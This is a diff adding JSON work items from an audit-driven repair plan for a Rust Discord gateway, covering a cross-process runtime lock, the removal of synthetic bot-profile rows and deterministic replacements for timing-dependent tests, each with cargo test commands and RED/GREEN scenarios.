+      "scenario": "- **R13 / D:** remove synthetic fallback profiles, propagate DB errors, unknown get ->404; if configured-but-unsaved identities must appear, represent separately as runtime connections, not deletable profile rows. `cargo test --bin omo-gateway bot_profile_delete_stays_deleted -- --nocapture`. Payload POST saved bot `1465631383862120451`, DELETE, GET list/detail. RED synthetic row returns; GREEN row absent and detail 404. QA: real loopback API CRUD and BotsPage reload sequence; DB unavailable returns error, not invented inventory.",
+      "redCommand": "cargo test --bin omo-gateway bot_profile_delete_stays_deleted -- --nocapture"
+    },
+    {
+      "id": "U70",
+      "title": "Cross-process runtime ownership lock",
+      "findings": [
+        "R.R22"
+      ],
+      "files": [
+        "src/entry.rs",
+        "src/main.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "src/entry.rs"
+      ],
+      "dependsOn": [
+        "U67",
+        "U68"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | R22 | Single process ownership / duplicate gateway startup | FIX P1 | `src/entry.rs:60-88`; `src/main.rs:1171-1174,1241,1264-1276,1409-1412`; `src/agent/omo_daemon.rs:20,179-188` | `H:gateway/status.py:882-924,1191-1222`: Rust checks duplicate bot identities only within one config; no process-level or credential-scoped runtime lock. A second gateway process adopts same ready daemon and starts duplicate Discord clients/muxes against same store. Process-local SPAWN_LOCK cannot prevent this. This is a local manual-start/launchd collision, not multi-host infrastructure. |",
+      "scenario": "- **R22 / A:** acquire RAII OS runtime lock before daemon/client startup, scoped to effective runtime identity (and credential collision protection if separate DB homes can reuse bot identities). `cargo test --bin omo-gateway duplicate_gateway_start_is_rejected -- --nocapture`. Payload two isolated child entry processes configured for same runtime identity; first signals lock acquired. RED both reach client-start seam; GREEN second fails explicitly before starting clients or adopting daemon; after first exit a third can acquire. QA: actual OS lock across subprocesses; no real Discord credentials/network. Existing within-config duplicate-token check is not cross-process coverage.",
+      "redCommand": "cargo test --bin omo-gateway duplicate_gateway_start_is_rejected -- --nocapture"
+    },
+    {
+      "id": "U71",
+      "title": "Deterministic causal test fixtures",
+      "findings": [
+        "AP.AP23",
+        "D.D18",
+        "S.F16",
+        "CFG.C14"
+      ],
+      "files": [
+        "src/discord/approval.rs",
+        "src/discord/adapter.rs",
+        "src/cron/scheduler.rs",
+        "tests/test_discord_adapter.rs",
+        "tests/test_omo_backend.rs",
+        "tests/test_multiplexer.rs",
+        "tests/test_profile_routing.rs",
+        "tests/test_voice_cron.rs"
+      ],
+      "tests": [
+        "tests/test_discord_adapter.rs",
+        "tests/test_multiplexer.rs",
+        "tests/test_omo_backend.rs",
+        "tests/test_profile_routing.rs"
+      ],
+      "dependsOn": [
+        "U04",
+        "U26",
+        "U59",
+        "U61",
+        "U64"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | AP23 | Approval test reliability | FIX, test defect | `src/discord/approval.rs:671-700` sleeps 55ms to demand >=2 heartbeats with a 200ms deadline, then sleeps again; scheduling load can resolve after timeout. H:`tools/approval.py:3126-3160` heartbeat behavior is periodic, not wall-clock scheduling luck. No test run claimed. | | D18 | P0 #6 verification; approval/egress tests | FIX (test defects) | R:2953-2965 uses real 50ms debounce and sequential awaited enqueue, so scheduling can flush early; R:2976 absence check uses wall-clock timeout. approval.rs:661-694 assumes two heartbeats within fixed 55ms sleep; R:3377 TTL test fixed 60ms sleep. tests/test_discord_adapter.rs:1330 `discord_egress_handles_typing_start_and_stop` uses real Http test-token and actually broadcasts typing. These are timing-luck/external-network checks, not reliable local verification. Hermes stream-consumer uses queue signals; no parity feature is implied by these test defects. | | F16 | Assigned test reliability | FIX P1 | `tests/test_multiplexer.rs:395-404` polls with sleeps; dedup negative check uses 300ms absence (`679-685`), not processed-event barrier. Fake server sends approval then sleeps 10ms before completion (`tests/test_omo_backend.rs:318`) while client later asserts response already recorded (1090-1104); server does not await that response. Existing tests can pass/fail by scheduling. No tests executed in audit. H: `turn_lease.py:277-302` identity-based completion principle (test rigor is local requirement). | | C14 | FIX test quality; profile-routing coverage | `tests/test_profile_routing.rs:130-142,231-243`; H:`gateway/profile_routing.py:151-166` | Both integration tests poll 500 x 10ms after action, despite comments claiming determinism; completion depends on timing. They prove session projection only, not daemon enforcement. Existing tests should be kept, changed to subscribe-before-action exact completion signaling. |",
+      "scenario": "### AP23 - deterministic heartbeat tests\n\nMinimal subscribe to heartbeat callback signal before waiting and resolve on second observed beat, or use Tokio paused clock/advance; completion joins prove no further callbacks. Remove wall-clock sleeps without skipping assertions. Scope only approval.rs test module, independent of production lifetime block. Test existing `test_wait_with_heartbeat_fires_periodically_and_stops_on_resolve`; `cargo test --lib test_wait_with_heartbeat_fires_periodically_and_stops_on_resolve`. RED no causal guarantee of >=2 beats before resolve/GREEN exactly two observed before resolve and no callbacks after completion under controlled clock. QA local test only; do not rewrite protected backend tests.\n\n\n\n| D18 | Only named existing tests in adapter.rs/approval.rs/test_discord_adapter.rs; inject clock/HTTP and explicit lifecycle signals. | `cargo test --test test_discord_adapter discord_egress_handles_typing_start_and_stop` and `cargo test --lib test_wait_with_heartbeat_fires_periodically_and_stops_on_resolve` : offline loopback-only transport; virtual ticks. RED network dependence or scheduler stall changes result -> exact requests/heartbeat count independent of wall clock. No fixed sleeps/polling or deleting assertions. |\n\n| F16 | T: response handshake in fake server; actor completion/barrier for negative assertions and GC. `cargo test --test test_multiplexer transcript_level_inbound_dedup_skips_duplicate_platform_message_id` and `cargo test --test test_omo_backend test_omo_backend_e2e_thread_lifecycle_and_streaming` | Hold server response-reader at explicit gate; client turn completes. RED approval assertion can run before response read; GREEN server awaits exact denial before completion. QA delayed scheduling by gate, not delay. Dedup third-event barrier proves duplicate skipped; GC idle command barrier replaces polling. |\n\n- **C14:** Replace polling captures with channel/Notify completion registered before route, bounded timeout. Scope `tests/test_profile_routing.rs` only. `cargo test --test test_profile_routing`. Payload existing two routed events and explicit-model case. RED current tests require polling sleeps; GREEN no sleeps, both exact completion signals observed and same state assertions. QA run once against real multiplexer/in-memory SQLite; never use retries to claim green.\n\nCron test-quality subcases (cron-audit.md existing-coverage section): tests/test_voice_cron.rs:183-267 uses fixed yield-count polling; src/cron/scheduler.rs:1793-1797 pins context prose; lease tests have unbounded receives. Replace these with subscribed committed-run signals and bounded receives; assert structured job/profile/run provenance instead of wording. Payload: held executor for job j, subscribe to committed cron_run before release. RED: existing completion assertion can outrun database commit or depends on a fixed yield budget; GREEN: committed row is observed before assertions independent of scheduling. QA: actual scheduler and temporary SQLite, control executor with a channel, no clock sleeps. Keep ACK timeout tests, since time is their behavior. Commands: cargo test --test test_voice_cron; cargo test --lib cron::scheduler::tests.",
+      "redCommand": "cargo test --lib test_wait_with_heartbeat_fires_periodically_and_stops_on_resolve && cargo test --test test_discord_adapter discord_egress_handles_typing_start_and_stop && cargo test --lib test_wait_with_heartbeat_fires_periodically_and_stops_on_resolve && cargo test --test test_multiplexer transcript_level_inbound_dedup_skips_duplicate_platform_message_id && cargo test --test test_omo_backend test_omo_backend_e2e_thread_lifecycle_and_streaming && cargo test --test test_profile_routing && cargo test --test test_voice_cron && cargo test --lib cron::scheduler::tests"
+    }
+  ],
+  "coverage": {
+    "present": 37,
+    "fix": 92,
+    "intentional": 14,
+    "notApplicable": 10
+  }
+}
